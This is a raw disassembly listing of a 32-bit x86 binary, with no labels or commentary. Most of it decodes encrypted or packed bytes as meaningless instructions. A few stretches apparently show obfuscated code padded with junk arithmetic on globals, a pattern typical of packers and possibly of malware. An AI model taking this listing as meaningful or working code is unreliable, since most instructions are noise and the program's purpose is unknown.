  41e73e:	or     edi,0xf8e43241
  41e744:	pop    ds
  41e745:	or     dl,BYTE PTR [ecx+eax*8-0x60]
  41e749:	add    al,0xcb
  41e74b:	mov    cl,0xd7
  41e74d:	xchg   esi,eax
  41e74e:	loop   0x41e714
  41e750:	add    BYTE PTR [esi+0x5bd2a46a],bl
  41e756:	js     0x41e752
  41e758:	cmp    al,0xb9
  41e75a:	push   esp
  41e75b:	std    
  41e75c:	loop   0x41e779
  41e75e:	out    dx,al
  41e75f:	dec    ebp
  41e760:	xchg   DWORD PTR [esi],ebp
  41e762:	ror    BYTE PTR [edx-0x47b8653e],1
  41e768:	mov    cl,0x4a
  41e76a:	in     eax,dx
  41e76b:	jg     0x41e749
  41e76d:	bound  ebp,QWORD PTR [edi]
  41e76f:	leave  
  41e770:	(bad)  
  41e771:	push   ebx
  41e772:	or     al,0x6f
  41e774:	popa   
  41e775:	push   ds
  41e776:	inc    esi
  41e777:	(bad)  
  41e778:	add    edx,DWORD PTR [ebx-0x6e]
  41e77b:	sbb    DWORD PTR [ebx+0x54],ebx
  41e77e:	push   edi
  41e77f:	push   DWORD PTR [ecx+ebx*8-0x897a40]
  41e786:	push   0xa12c2564
  41e78b:	mov    gs,WORD PTR [edi]
  41e78d:	pop    ebx
  41e78e:	pop    es
  41e78f:	dec    esp
  41e790:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e791:	cmc    
  41e792:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e793:	(bad)
  41e797:	sbb    DWORD PTR [ebx+eax*4-0x2],ecx
  41e79b:	cmp    eax,0x12836840
  41e7a0:	mov    ds:0xdb4d13cb,al
  41e7a5:	imul   edx,DWORD PTR [esi-0x63c291b5],0x37
  41e7ac:	inc    ebx
  41e7ad:	mov    edi,DWORD PTR [edi-0x330a45c7]
  41e7b3:	inc    eax
  41e7b4:	mov    BYTE PTR [edx],bh
  41e7b6:	les    edx,FWORD PTR [ebp-0x6c3a3856]
  41e7bc:	bound  edi,QWORD PTR [edx-0x714ee748]
  41e7c2:	int3   
  41e7c3:	fdiv   st,st(0)
  41e7c5:	inc    ecx
  41e7c6:	mov    ecx,0x6ea1e790
  41e7cb:	inc    eax
  41e7cc:	ret    
  41e7cd:	jge    0x41e78f
  41e7cf:	ret    0xb276
  41e7d2:	mov    WORD PTR [esi-0x3cdcdaa9],ss
  41e7d8:	cmp    edx,DWORD PTR [ebx+esi*1+0x51]
  41e7dc:	pop    ecx
  41e7dd:	push   ss
  41e7de:	jmp    DWORD PTR [eax]
  41e7e0:	jb     0x41e7aa
  41e7e2:	add    eax,0x3bad926e
  41e7e7:	fucom  st(2)
  41e7e9:	cdq    
  41e7ea:	call   0xd3f4:0x72dabed
  41e7f1:	jl     0x41e7e3
  41e7f3:	dec    edi
  41e7f4:	cdq    
  41e7f5:	hlt    
  41e7f6:	div    DWORD PTR [edi]
  41e7f8:	shl    BYTE PTR [eax+0x26],cl
  41e7fb:	dec    eax
  41e7fc:	mov    al,ds:0x2b886451
  41e801:	jmp    0x216498d3
  41e806:	mov    ebp,0xee522dd
  41e80b:	popf   
  41e80c:	push   cs
  41e80d:	bound  ecx,QWORD PTR [ecx+0x65]
  41e810:	jmp    0x1e32024
  41e815:	pop    edi
  41e816:	(bad)  
  41e817:	and    al,0xd0
  41e819:	push   es
  41e81a:	cs ss lar ebx,si
  41e81f:	repnz sti 
  41e821:	scas   al,BYTE PTR es:[edi]
  41e822:	mov    eax,ds:0xa585dc4e
  41e827:	frstor [ebp+ecx*2+0x55]
  41e82b:	or     eax,0x93b0ae55
  41e830:	mov    dl,0x74
  41e832:	xor    al,0xba
  41e834:	dec    edx
  41e835:	or     ch,dh
  41e837:	test   DWORD PTR [edi-0x35],esi
  41e83a:	push   ebp
  41e83b:	lods   eax,DWORD PTR ds:[esi]
  41e83c:	fsubr  DWORD PTR [ebx+0x64]
  41e83f:	inc    DWORD PTR [ebp-0x14]
  41e842:	pop    ecx
  41e843:	leave  
  41e844:	xchg   edx,eax
  41e845:	mov    esp,0x69dfe216
  41e84a:	fs ins DWORD PTR es:[edi],dx
  41e84c:	and    dl,BYTE PTR [edi]
  41e84e:	rcr    DWORD PTR [ebx-0x3fe11e3f],0x88
  41e855:	popf   
  41e856:	fs inc edx
  41e858:	xchg   ebx,eax
  41e859:	xchg   al,ch
  41e85b:	pop    es
  41e85c:	imul   ebp,DWORD PTR [esi+0x30],0xd9efacb4
  41e863:	inc    ecx
  41e864:	jmp    0x5689:0x9c0be6b8
  41e86b:	addr16 push esi
  41e86d:	adc    ebp,DWORD PTR [edx]
  41e86f:	xchg   ebx,eax
  41e870:	cmp    BYTE PTR [edx+eiz*2],bh
  41e873:	pop    edx
  41e874:	xchg   BYTE PTR [ebp-0x7518ede3],cl
  41e87a:	test   DWORD PTR [ebx-0x62],esp
  41e87d:	xlat   BYTE PTR ds:[ebx]
  41e87e:	fistp  QWORD PTR [ebx+ecx*8+0x5f585830]
  41e885:	xor    DWORD PTR [ebx+0x7d],esi
  41e888:	add    eax,0xdf824ec
  41e88d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e88e:	xchg   dl,cl
  41e890:	jbe    0x41e8e1
  41e892:	push   eax
  41e893:	jo     0x41e833
  41e895:	add    eax,0x82c18356
  41e89a:	(bad)  
  41e89c:	call   0x98ab7533
  41e8a1:	jno    0x41e907
  41e8a3:	and    BYTE PTR [esi-0x1b],dl
  41e8a6:	jecxz  0x41e8e1
  41e8a8:	mul    DWORD PTR [eax+eiz*4+0x5c93d13a]
  41e8af:	adc    eax,0x9003cee1
  41e8b4:	mov    eax,ds:0x314e1c4d
  41e8b9:	xor    BYTE PTR ds:0x98692de8,dl
  41e8bf:	jmp    0x293b:0xcf267c3a
  41e8c6:	pop    esp
  41e8c7:	call   FWORD PTR [ecx+ebx*4+0x2b67cbd8]
  41e8ce:	(bad)  
  41e8cf:	adc    esi,DWORD PTR [ebp+0xb933e0d]
  41e8d5:	stos   BYTE PTR es:[edi],al
  41e8d6:	mov    ch,0xe9
  41e8d8:	push   ss
  41e8d9:	and    eax,0x360909fb
  41e8de:	in     eax,dx
  41e8df:	int    0x8
  41e8e1:	and    al,0x9f
  41e8e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8e4:	shl    DWORD PTR [ecx+0xd],1
  41e8e7:	hlt    
  41e8e8:	cdq    
  41e8e9:	das    
  41e8ea:	xchg   edx,eax
  41e8eb:	dec    ecx
  41e8ec:	sbb    DWORD PTR [ebx],eax
  41e8ee:	jmp    ebx
  41e8f0:	jae    0x41e873
  41e8f2:	xchg   ecx,eax
  41e8f3:	pop    ebx
  41e8f4:	rol    BYTE PTR [ebp-0x18],1
  41e8f7:	dec    edi
  41e8f8:	push   ds
  41e8f9:	mov    al,0xed
  41e8fb:	ins    DWORD PTR es:[edi],dx
  41e8fc:	xor    al,bl
  41e8fe:	(bad)  
  41e900:	fwait
  41e901:	jge    0x41e8b4
  41e903:	pop    ss
  41e904:	out    0xf4,al
  41e906:	mov    es,WORD PTR [edi+0x747cbd58]
  41e90c:	mov    DWORD PTR gs:[esi],0x985e6014
  41e913:	push   eax
  41e914:	xor    al,0x44
  41e916:	or     eax,0xcdcb809a
  41e91b:	shr    DWORD PTR [eax+0x23b33ad],0x4a
  41e922:	sub    edx,ebp
  41e924:	push   0x1f9e1e8f
  41e929:	daa    
  41e92a:	stc    
  41e92b:	or     bh,BYTE PTR [ecx-0x3e885129]
  41e931:	sub    BYTE PTR [esi-0x1923a532],0xe4
  41e938:	cld    
  41e939:	jg     0xd371aff8
  41e93f:	sub    ebx,DWORD PTR [ebx+0x8]
  41e942:	push   0x50
  41e944:	jns    0x41e952
  41e946:	mov    esp,0xd1cba30
  41e94b:	or     BYTE PTR [ecx+ebp*4-0x6c],bh
  41e94f:	stos   BYTE PTR es:[edi],al
  41e950:	cwde   
  41e951:	in     al,dx
  41e952:	add    ebx,DWORD PTR [ebx]
  41e954:	call   0xec46:0x43ab4fe6
  41e95b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e95c:	sub    ebp,DWORD PTR [ebx+eax*2]
  41e95f:	mov    bh,BYTE PTR [esi]
  41e961:	leave  
  41e962:	ss mov ebx,0x4f1bb9a9
  41e968:	pop    ebp
  41e969:	stos   DWORD PTR es:[edi],eax
  41e96a:	fs xchg edi,eax
  41e96c:	pop    es
  41e96d:	out    0x9b,al
  41e96f:	addr16 int 0xc8
  41e972:	cmp    edi,edx
  41e974:	push   cs
  41e975:	pop    edx
  41e976:	dec    ecx
  41e977:	imul   esp,DWORD PTR [edi+0x34],0xffffffbb
  41e97b:	scas   al,BYTE PTR es:[edi]
  41e97c:	pop    ds
  41e97d:	fmul   st,st(6)
  41e97f:	jmp    0xba73099
  41e984:	xlat   BYTE PTR ds:[ebx]
  41e985:	mov    ecx,edx
  41e987:	mov    edx,DWORD PTR [esp+0x18]
  41e98b:	xor    eax,ebx
  41e98d:	xor    ecx,esi
  41e98f:	mov    esi,DWORD PTR [esp+0x1c]
  41e993:	cmp    edx,eax
  41e995:	jne    0x41e9a3
  41e99b:	cmp    esi,ecx
  41e99d:	je     0x41e9ea
  41e9a3:	push   DWORD PTR ds:0x422688
  41e9a9:	push   DWORD PTR ds:0x42241c
  41e9af:	mov    eax,ds:0x422598
  41e9b4:	mov    eax,DWORD PTR [eax+0x1a4]
  41e9ba:	push   DWORD PTR [eax]
  41e9bc:	mov    eax,DWORD PTR [esp+0x78]
  41e9c0:	call   eax
  41e9c2:	mov    ecx,DWORD PTR ds:0x422598
  41e9c8:	mov    ecx,DWORD PTR [ecx+0x1dc]
  41e9ce:	mov    DWORD PTR [ecx],eax
  41e9d0:	mov    eax,ds:0x422598
  41e9d5:	push   0x4
  41e9d7:	add    eax,0x1dc
  41e9dc:	push   eax
  41e9dd:	lea    eax,[esp+0x84]
  41e9e4:	push   eax
  41e9e5:	call   0x415231
  41e9ea:	mov    eax,DWORD PTR [esp+0x7c]
  41e9ee:	mov    eax,DWORD PTR [eax]
  41e9f0:	pop    edi
  41e9f1:	pop    esi
  41e9f2:	pop    ebx
  41e9f3:	mov    esp,ebp
  41e9f5:	pop    ebp
  41e9f6:	ret    0xc
  41e9f9:	push   ebp
  41e9fa:	mov    ebp,esp
  41e9fc:	sub    esp,0x23c
  41ea02:	or     ecx,eax
  41ea04:	push   ebx
  41ea05:	cmp    DWORD PTR ds:0x4282a7,0x0
  41ea0c:	mov    DWORD PTR ds:0x4283b3,0x7749
  41ea16:	mov    DWORD PTR ds:0x4281b3,ebx
  41ea1c:	mov    DWORD PTR ds:0x428353,edx
  41ea22:	mov    DWORD PTR ds:0x428353,0xc7b
  41ea2c:	jmp    0x41ea8e
  41ea31:	mov    DWORD PTR ds:0x4282cb,edx
  41ea37:	cmp    DWORD PTR ds:0x4282a7,0x0
  41ea3e:	jg     0x41ea74
  41ea44:	push   0x2154
  41ea49:	push   0x5063
  41ea4e:	call   DWORD PTR ds:0x428e54
  41ea54:	sbb    DWORD PTR ds:0x4283af,ecx
  41ea5a:	mov    ecx,DWORD PTR ds:0x42835b
  41ea60:	xor    ecx,DWORD PTR ds:0x428347
  41ea66:	mov    DWORD PTR ds:0x42835b,ecx
  41ea6c:	sbb    ecx,0x6e15
  41ea72:	neg    ecx
  41ea74:	xor    DWORD PTR ds:0x428283,ecx
  41ea7a:	adc    ecx,DWORD PTR ds:0x4281d7
  41ea80:	mov    ecx,DWORD PTR ds:0x428223
  41ea86:	mov    ecx,DWORD PTR [ecx]
  41ea88:	and    DWORD PTR ds:0x4281c7,ecx
  41ea8e:	push   esi
  41ea8f:	mov    ecx,DWORD PTR ds:0x428237
  41ea95:	mov    eax,ds:0x428323
  41ea9a:	sub    eax,ecx
  41ea9c:	imul   ecx,DWORD PTR [ecx+eax*1]
  41eaa0:	push   edi
  41eaa1:	add    DWORD PTR ds:0x42829b,ebx
  41eaa7:	mov    DWORD PTR [ebp-0x50],0x1
  41eaae:	sub    DWORD PTR ds:0x4282cb,edi
  41eab4:	mov    DWORD PTR [ebp-0xbc],0x61a1
  41eabe:	xor    DWORD PTR ds:0x42835b,0x437e
  41eac8:	mov    DWORD PTR [ebp-0xb8],0x1
  41ead2:	mov    ecx,DWORD PTR [ebp-0xb8]
  41ead8:	add    eax,0x2e28
  41eadd:	mov    eax,0x584
  41eae2:	xor    edx,edx
  41eae4:	sbb    DWORD PTR ds:0x4283d7,0x42832f
  41eaee:	div    ecx
  41eaf0:	xor    ecx,0x2352
  41eaf6:	imul   eax,eax,0x51d4
  41eafc:	neg    ecx
  41eafe:	mov    ecx,DWORD PTR [ebp-0xbc]
  41eb04:	or     DWORD PTR ds:0x4283c3,0x4283d3
  41eb0e:	xor    eax,ecx
  41eb10:	and    eax,0x4c09
  41eb15:	xor    ecx,DWORD PTR ds:0x428343
  41eb1b:	mov    ecx,DWORD PTR [ebp-0x50]
  41eb1e:	xor    edx,edx
  41eb20:	and    DWORD PTR ds:0x42829b,0x4281cf
  41eb2a:	div    ecx
  41eb2c:	or     DWORD PTR ds:0x4283e7,0x3423
  41eb36:	sub    eax,0x401
  41eb3b:	cmp    DWORD PTR ds:0x428367,0x0
  41eb42:	mov    DWORD PTR ds:0x4283d7,edx
  41eb48:	mov    DWORD PTR ds:0x428277,ebx
  41eb4e:	not    DWORD PTR ds:0x428273
  41eb54:	jmp    0x41ebb2
  41eb59:	mov    DWORD PTR ds:0x42826b,0x3ca0
  41eb63:	not    DWORD PTR ds:0x428357
  41eb69:	cmp    DWORD PTR ds:0x428367,0x0
  41eb70:	je     0x41eba0
  41eb76:	push   DWORD PTR [ebp-0x10]
  41eb79:	push   0x4da1
  41eb7e:	push   0x1144
  41eb83:	push   DWORD PTR [ebp-0x18]
  41eb86:	call   DWORD PTR ds:0x428e58
  41eb8c:	add    edx,0x1800
  41eb92:	add    edx,DWORD PTR ds:0x4283cf
  41eb98:	sub    ecx,ecx
  41eb9a:	adc    ecx,0x47f1
  41eba0:	sub    edx,edx
  41eba2:	mov    DWORD PTR ds:0x4283d7,0x44a4
  41ebac:	and    ecx,DWORD PTR ds:0x42826f
  41ebb2:	mov    DWORD PTR [ebp-0x90],eax
  41ebb8:	mov    eax,ds:0x428303
  41ebbd:	mov    eax,DWORD PTR [eax]
  41ebbf:	sbb    DWORD PTR ds:0x4283d3,eax
  41ebc5:	mov    DWORD PTR [ebp-0x8c],0x2ff8
  41ebcf:	add    DWORD PTR ds:0x42819b,0x4282e7
  41ebd9:	mov    DWORD PTR [ebp-0x4c],0x39f7
  41ebe0:	xor    DWORD PTR ds:0x42828f,edx
  41ebe6:	mov    DWORD PTR [ebp-0xb4],0x3842
  41ebf0:	or     edx,ecx
  41ebf2:	jmp    0x41ef4e
  41ebf7:	ret    0x8bf6
  41ebfa:	push   ebx
  41ebfb:	sbb    ch,BYTE PTR [ebx]
  41ebfd:	mov    edx,0x71125f66
  41ec02:	mov    al,0xbe
  41ec04:	mov    eax,ds:0x2f0ebefe
  41ec09:	push   ss
  41ec0a:	sbb    BYTE PTR [ebx-0x16e7e7ee],ah
  41ec10:	inc    ecx
  41ec11:	mov    ch,0xf8
  41ec13:	inc    esi
  41ec14:	jg     0x41ec21
  41ec16:	cdq    
  41ec17:	dec    edx
  41ec18:	lea    eax,[edi-0x1c]
  41ec1b:	sub    DWORD PTR [esp+ebp*8],eax
  41ec1e:	jae    0x41ec9f
  41ec20:	sti    
  41ec21:	cmp    BYTE PTR ds:0xb5676473,0xef
  41ec28:	in     al,0x52
  41ec2a:	retf   0xffd4
  41ec2d:	clc    
  41ec2e:	xor    eax,0xac833a3
  41ec33:	imul   esi,DWORD PTR [ebx],0xffffffaf
  41ec36:	call   edi
  41ec38:	clc    
  41ec39:	lea    eax,[eax+ebp*8]
  41ec3c:	sub    DWORD PTR [ebx+0x42312f03],ebp
  41ec42:	push   0x16
  41ec44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec45:	cs sbb al,0x28
  41ec48:	pop    esi
  41ec49:	int    0x1e
  41ec4b:	ins    DWORD PTR es:[edi],dx
  41ec4c:	push   ebx
  41ec4d:	pushf  
  41ec4e:	std    
  41ec4f:	lahf   
  41ec50:	enter  0xc8a9,0x67
  41ec54:	inc    ebp
  41ec55:	aas    
  41ec56:	js     0x41ec3c
  41ec58:	inc    edi
  41ec59:	test   al,0x38
  41ec5b:	retf   
  41ec5c:	js     0x41ec5f
  41ec5e:	inc    eax
  41ec5f:	jo     0x41ec5a
  41ec61:	mov    ecx,0x32215133
  41ec66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec67:	adc    BYTE PTR fs:[edx-0x70],dh
  41ec6b:	sub    BYTE PTR ds:0xdd12afa3,ch
  41ec71:	leave  
  41ec72:	mov    eax,ds:0x24f27982
  41ec77:	and    DWORD PTR [edi-0x6a186ca7],ecx
  41ec7d:	in     al,dx
  41ec7e:	mov    ebp,0x69f095ca
  41ec83:	mov    esp,0x8bccda7f
  41ec88:	cdq    
  41ec89:	dec    edi
  41ec8a:	adc    al,ch
  41ec8c:	test   DWORD PTR [edx],edi
  41ec8e:	inc    eax
  41ec8f:	dec    ebx
  41ec90:	loop   0x41ecff
  41ec92:	(bad)  
  41ec93:	rcl    esi,1
  41ec95:	jbe    0x41ed08
  41ec97:	retf   0xa895
  41ec9a:	add    al,0xfb
  41ec9c:	test   DWORD PTR [ebp-0x71a39ec5],esi
  41eca2:	pop    ebx
  41eca3:	inc    ebx
  41eca4:	dec    esp
  41eca5:	jecxz  0x41ec6f
  41eca7:	inc    esp
  41eca8:	sti    
  41eca9:	jmp    0xa5614e35
  41ecae:	test   BYTE PTR [edi],0x13
  41ecb1:	pop    es
  41ecb2:	mov    cl,bl
  41ecb4:	lods   al,BYTE PTR ds:[esi]
  41ecb5:	enter  0x3109,0x5b
  41ecb9:	xchg   BYTE PTR [edx+edi*1],bl
  41ecbc:	jne    0x41ec85
  41ecbe:	push   esi
  41ecbf:	test   BYTE PTR [edi],ah
  41ecc1:	loopne 0x41ed3b
  41ecc3:	popf   
  41ecc4:	and    BYTE PTR [esi+0xfd43d35],0x7a
  41eccb:	js     0x41ed40
  41eccd:	pop    esp
  41ecce:	stos   BYTE PTR es:[edi],al
  41eccf:	mov    cl,0xfd
  41ecd1:	push   esi
  41ecd2:	cmp    esi,DWORD PTR ds:0xf8bccba2
  41ecd8:	add    DWORD PTR [eax-0x49],0xffffffed
  41ecdc:	push   edi
  41ecdd:	test   DWORD PTR [ebp-0x92cdce5],ecx
  41ece3:	inc    edi
  41ece4:	and    eax,0x2a396cc9
  41ece9:	addr16 jo 0x41ecf3
  41ecec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eced:	sub    al,0xe7
  41ecef:	xchg   dh,dl
  41ecf1:	sub    edx,DWORD PTR [ebx]
  41ecf3:	(bad)  [esi+0x69]
  41ecf6:	cmp    edx,eax
  41ecf8:	xor    al,0x6c
  41ecfa:	scas   eax,DWORD PTR es:[edi]
  41ecfb:	mov    cl,0xa8
  41ecfd:	(bad)  
  41ecfe:	mov    bl,0x72
  41ed00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed01:	loop   0x41ecd6
  41ed03:	push   ss
  41ed04:	push   eax
  41ed05:	aam    0x92
  41ed07:	push   0x4c4487d8
  41ed0c:	out    dx,eax
  41ed0d:	mov    bh,0x5e
  41ed0f:	push   es
  41ed10:	call   0x85944a15
  41ed15:	out    0xdc,al
  41ed17:	mov    esp,0xa90202b7
  41ed1c:	syscall 
  41ed1e:	cmp    edi,ebp
  41ed20:	aaa    
  41ed21:	push   ebx
  41ed22:	pop    edi
  41ed23:	jno    0x41ecf0
  41ed25:	cmp    dh,BYTE PTR [edi]
  41ed27:	stos   DWORD PTR es:[edi],eax
  41ed28:	scas   eax,DWORD PTR es:[edi]
  41ed29:	popf   
  41ed2a:	xchg   esp,eax
  41ed2b:	add    edi,DWORD PTR [eax+ebx*4-0x77cc0da0]
  41ed32:	repnz xor DWORD PTR [edi+0x25335a1f],ecx
  41ed39:	jl     0x41ed77
  41ed3b:	iret   
  41ed3c:	xchg   edi,eax
  41ed3d:	mov    ah,0xe
  41ed3f:	mov    eax,ds:0xfe0e8796
  41ed44:	xor    eax,DWORD PTR [esi-0x79]
  41ed47:	push   esi
  41ed48:	scas   eax,DWORD PTR es:[edi]
  41ed49:	and    BYTE PTR ds:0xce9a6482,bh
  41ed4f:	sbb    dh,BYTE PTR [ebx]
  41ed51:	inc    edx
  41ed52:	mov    al,0xa0
  41ed54:	push   ss
  41ed55:	mov    edi,0x7f8121b9
  41ed5a:	hlt    
  41ed5b:	les    edi,FWORD PTR [ecx-0x2b]
  41ed5e:	fsqrt  
  41ed60:	add    eax,0x9d2021b3
  41ed65:	call   0x9a06:0x371b067e
  41ed6c:	dec    edx
  41ed6d:	mov    edx,0xd4883372
  41ed72:	xchg   edx,eax
  41ed73:	adc    esp,0x27850f0c
  41ed79:	push   es
  41ed7a:	cmp    BYTE PTR ds:0x7ec2ad60,0x58
  41ed81:	sub    al,0xb3
  41ed83:	jge    0x41ed86
  41ed85:	popf   
  41ed86:	sub    DWORD PTR [edx],edx
  41ed88:	jmp    0x41edd8
  41ed8a:	lock pop es
  41ed8c:	mov    dl,0x80
  41ed8e:	pop    esp
  41ed8f:	and    BYTE PTR [ecx-0x17],bh
  41ed92:	add    eax,0xbeae99a5
  41ed97:	sbb    bh,BYTE PTR [ecx+ecx*1]
  41ed9a:	in     al,0x3
  41ed9c:	std    
  41ed9d:	push   esp
  41ed9e:	imul   ebp,DWORD PTR [eax+0x3c],0x44b9ce97
  41eda5:	mov    ds:0x4080a218,eax
  41edaa:	inc    eax
  41edab:	xchg   ebx,eax
  41edac:	mov    ecx,DWORD PTR [edx+0xef7081a]
  41edb2:	jbe    0x41edfb
  41edb4:	cmp    eax,0xdb5a4162
  41edb9:	adc    esi,ebp
  41edbb:	pop    edi
  41edbc:	adc    eax,DWORD PTR [eax-0x10]
  41edbf:	xchg   edx,eax
  41edc0:	stos   DWORD PTR es:[edi],eax
  41edc1:	xor    ebx,DWORD PTR [eax+0x55e51995]
  41edc7:	ja     0x41ee37
  41edc9:	sub    dl,BYTE PTR [esi-0x1f]
  41edcc:	mov    ds:0xe5b6be7c,eax
  41edd1:	sbb    eax,0x48467e54
  41edd6:	push   0x3abf4615
  41eddb:	pop    edx
  41eddc:	push   ecx
  41eddd:	sbb    DWORD PTR [eax],0x60
  41ede0:	outs   dx,DWORD PTR ds:[esi]
  41ede1:	sbb    al,0x5f
  41ede3:	leave  
  41ede4:	or     esi,DWORD PTR [ebp-0xea00558]
  41edea:	stos   DWORD PTR es:[edi],eax
  41edeb:	jnp    0x41ee17
  41eded:	je     0x41ee1e
  41edef:	hlt    
  41edf0:	div    BYTE PTR [ebx]
  41edf2:	(bad)  
  41edf3:	sub    al,0xcc
  41edf5:	std    
  41edf6:	imul   esp,DWORD PTR [eax+0x7c5e6fd9],0xffffff9a
  41edfd:	je     0x41edbb
  41edff:	push   esp
  41ee00:	dec    eax
  41ee01:	(bad)  
  41ee02:	cmc    
  41ee03:	lds    ecx,FWORD PTR [esi+0x66]
  41ee06:	inc    eax
  41ee07:	leave  
  41ee08:	pop    ebp
  41ee09:	inc    eax
  41ee0a:	lods   eax,DWORD PTR ds:[esi]
  41ee0b:	and    ah,BYTE PTR [edi-0x8a2ecba]
  41ee11:	les    esi,FWORD PTR [esi-0x1]
  41ee14:	stc    
  41ee15:	icebp  
  41ee16:	xor    dl,dh
  41ee18:	adc    eax,0xf5c93ceb
  41ee1d:	ds pop ecx
  41ee1f:	dec    ecx
  41ee20:	jne    0x41ee03
  41ee22:	jb     0x41ee5f
  41ee24:	stos   DWORD PTR es:[edi],eax
  41ee25:	and    ah,BYTE PTR [ecx+ebp*2]
  41ee28:	jne    0x41ee9e
  41ee2a:	mov    ecx,0xbe6bc408
  41ee2f:	ret    0xd6e2
  41ee32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee33:	daa    
  41ee34:	inc    edi
  41ee35:	out    dx,al
  41ee36:	mov    ebp,DWORD PTR [ebp+0x7e]
  41ee39:	in     al,0x44
  41ee3b:	jp     0x41edc7
  41ee3d:	pop    edx
  41ee3e:	mov    ebx,0x1858b943
  41ee43:	aad    0x5e
  41ee45:	or     edx,edi
  41ee47:	dec    esi
  41ee48:	and    DWORD PTR [ebx],esi
  41ee4a:	mov    ebx,0x1d0c7b7
  41ee4f:	xchg   ecx,eax
  41ee50:	adc    DWORD PTR [eax-0x66b42e0a],ebx
  41ee56:	mov    dh,0xc3
  41ee58:	sub    BYTE PTR [edi-0x38f21758],ch
  41ee5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee5f:	push   0xa88b2f80
  41ee64:	bound  esp,QWORD PTR [edx+eax*4+0x57b08c65]
  41ee6b:	outs   dx,DWORD PTR ds:[esi]
  41ee6c:	or     DWORD PTR [edi-0x5cbf18ef],esi
  41ee72:	aas    
  41ee73:	fnstenv [eax-0x5b148b5]
  41ee79:	leave  
  41ee7a:	sub    ebp,ebp
  41ee7c:	loope  0x41ee08
  41ee7e:	addr16 fucomp st(6)
  41ee81:	sub    ah,BYTE PTR [ecx-0xf5798e7]
  41ee87:	add    DWORD PTR [edx-0x1],ebx
  41ee8a:	loope  0x41ee4a
  41ee8c:	test   eax,0xbe6781f2
  41ee91:	jge    0x41eef9
  41ee93:	jg     0x41ef01
  41ee95:	xchg   edx,eax
  41ee96:	lods   al,BYTE PTR ds:[esi]
  41ee97:	jge    0x41ee89
  41ee99:	xor    cl,BYTE PTR [edi-0x33]
  41ee9c:	ret    
  41ee9d:	mov    eax,ds:0xacf2068f
  41eea2:	inc    edi
  41eea3:	sub    eax,0x5f5b1dda
  41eea8:	sahf   
  41eea9:	mov    ecx,0x750f6421
  41eeae:	or     al,0x70
  41eeb0:	and    eax,0x8fcac2d1
  41eeb5:	out    0xac,eax
  41eeb7:	test   BYTE PTR [edi],bl
  41eeb9:	pop    edx
  41eeba:	inc    ecx
  41eebb:	pop    edx
  41eebc:	clc    
  41eebd:	(bad)  
  41eebe:	cmp    eax,DWORD PTR [edi+0x142f91d]
  41eec4:	jbe    0x41ef04
  41eec6:	test   WORD PTR [edx-0x33],di
  41eeca:	pop    edx
  41eecb:	add    DWORD PTR [esi],0xffffffe4
  41eece:	add    eax,0xf150b639
  41eed3:	scas   eax,DWORD PTR es:[edi]
  41eed4:	aas    
  41eed5:	pop    ebx
  41eed6:	lahf   
  41eed7:	inc    edx
  41eed8:	test   eax,0xca6ebae0
  41eedd:	inc    eax
  41eede:	adc    eax,0x12774a55
  41eee3:	(bad)  
  41eee5:	ss jnp 0x41eea4
  41eee8:	cmp    BYTE PTR [ebp-0x3f],dh
  41eeeb:	fnstenv [esi+eax*2]
  41eeee:	jecxz  0x41ee72
  41eef0:	inc    esi
  41eef1:	js     0x41eeba
  41eef3:	pop    es
  41eef4:	stos   BYTE PTR es:[edi],al
  41eef5:	addr16 in eax,0xd1
  41eef8:	mov    ch,0xea
  41eefa:	push   ebx
  41eefb:	jno    0x41eeab
  41eefd:	and    bl,0xb9
  41ef00:	sar    DWORD PTR [ebx],0xe3
  41ef03:	jge    0x41ef30
  41ef05:	mov    gs,WORD PTR [esi+ebp*4]
  41ef08:	fsub   DWORD PTR [edx]
  41ef0a:	mov    ch,0xd8
  41ef0c:	sbb    eax,0x516658bb
  41ef11:	adc    DWORD PTR [ecx+0x5b787450],0xdd532088
  41ef1b:	or     BYTE PTR [edx],ch
  41ef1d:	xchg   ebp,eax
  41ef1e:	adc    BYTE PTR [edx],0xc2
  41ef21:	mov    DWORD PTR [edx],ebp
  41ef23:	stos   DWORD PTR es:[edi],eax
  41ef24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef25:	fadd   DWORD PTR [esi]
  41ef27:	lahf   
  41ef28:	std    
  41ef29:	ret    
  41ef2a:	repnz dec eax
  41ef2c:	in     al,dx
  41ef2d:	jb     0x41ef26
  41ef2f:	add    eax,0x2aa12042
  41ef34:	js     0x41efb0
  41ef36:	mov    eax,0xb5894571
  41ef3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef3c:	adc    al,0xb5
  41ef3e:	or     BYTE PTR [ebp+0x6bfc399a],cl
  41ef44:	(bad)  
  41ef45:	xlat   BYTE PTR ds:[ebx]
  41ef46:	popf   
  41ef47:	pop    ds
  41ef48:	jmp    0x41eedb
  41ef4a:	sub    DWORD PTR [edi+0xb],ecx
  41ef4d:	out    0x8b,eax
  41ef4f:	inc    ebp
  41ef50:	mov    ah,0x81
  41ef52:	adc    eax,0x4281af
  41ef57:	xchg   ebx,eax
  41ef58:	xor    al,0x0
  41ef5a:	add    BYTE PTR [ebx],al
  41ef5c:	test   DWORD PTR [edi+edi*8-0x1],ecx
  41ef60:	inc    DWORD PTR [ecx+0x29cf2]
  41ef66:	add    BYTE PTR ds:0x2e02,dh
  41ef6c:	sbb    ecx,ecx
  41ef6e:	xor    eax,0x7294
  41ef73:	movzx  edx,WORD PTR ds:0x4282d3
  41ef7a:	sbb    DWORD PTR ds:0x4281af,edx
  41ef80:	imul   eax,eax,0x68f3
  41ef86:	and    DWORD PTR ds:0x4281c7,edi
  41ef8c:	mov    ecx,DWORD PTR [ebp-0x8c]
  41ef92:	cmp    DWORD PTR ds:0x42833b,0x0
  41ef99:	mov    edx,0x254
  41ef9e:	mov    edx,0x254c
  41efa3:	mov    edx,0x6b4f
  41efa8:	jmp    0x41f000
  41efad:	mov    DWORD PTR ds:0x42832b,0x78fa
